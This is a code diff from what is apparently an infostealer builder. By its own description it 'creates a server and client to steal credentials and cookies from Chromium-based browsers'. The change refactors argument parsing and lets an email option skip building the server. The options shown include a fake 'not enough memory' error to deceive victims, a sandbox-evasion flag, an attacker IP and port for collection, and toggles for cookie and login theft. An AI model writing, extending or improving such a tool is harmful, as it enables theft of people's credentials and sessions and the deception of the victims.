@@ -147,8 +147,8 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
     return False
 
 
-def build_server(filename="server", icon="server.ico", port=80, nobuild=True, linux=False, email=False):
-    if nobuild or email:
+def build_server(filename="server", icon="server.ico", port=80, nobuild=True, linux=False):
+    if nobuild:
         return True
     replacement_maps = [{
         "<<PORT>>": str(port)
@@ -199,10 +199,7 @@ def check_valid_port(port):
         raise ValueError(f"Port needs to be an integer")
 
 
-def parse_arguments():
-    error_message = "There isn't enough memory to complete this action. Try using less data or closing other applications."
-    parser = argparse.ArgumentParser(
-        description='Creates a server and client to steal credentials and cookies from Chromium-based browsers: (Chrome, Chromium, Edge, Brave, etc...)')
+def set_arguments(parser: argparse.ArgumentParser, error_message: str):
     parser.add_argument('--ip', metavar="IP", type=str, default="127.0.0.1",
                         help="IP address to connect to, or reverse dns. Default is 127.0.0.1")
     parser.add_argument('--port', metavar="PORT", type=check_valid_port, default=80,
@@ -229,7 +226,14 @@ def parse_arguments():
                         action="store_true", default=False, help="Builds the server for linux")
     parser.add_argument('--sandbox', dest="sandbox",
                         action="store_true", default=False, help="Helps evade some sandbox environments. Requires internet access, otherwise it fails. This may increase AV detection")
+    return parser
 
+
+def parse_arguments():
+    error_message = "There isn't enough memory to complete this action. Try using less data or closing other applications."
+    parser = argparse.ArgumentParser(
+        description='Creates a server and client to steal credentials and cookies from Chromium-based browsers: (Chrome, Chromium, Edge, Brave, etc...)')
+    parser = set_arguments(parser, error_message)
     args = parser.parse_args()
     try:
         socket.gethostbyname(args.ip)
@@ -238,8 +242,11 @@ def parse_arguments():
         return False
 
     reset_folders()
-    server = build_server(
-        port=args.port, nobuild=args.noserver, linux=args.linux, email=args.email_bool)
+    if not args.email_bool:
+        server = build_server(
+            port=args.port, nobuild=args.noserver, linux=args.linux)
+    else:
+        server = True
     client = build_client(ip_address=args.ip, error_bool=args.error_bool, error_message=args.message,
                           cookies=args.cookies_bool, login=args.login_bool, port=args.port, nobuild=args.noclient, sandbox=args.sandbox, email=args.email_bool, username=args.username, password=args.password)
     build_message(server, client)
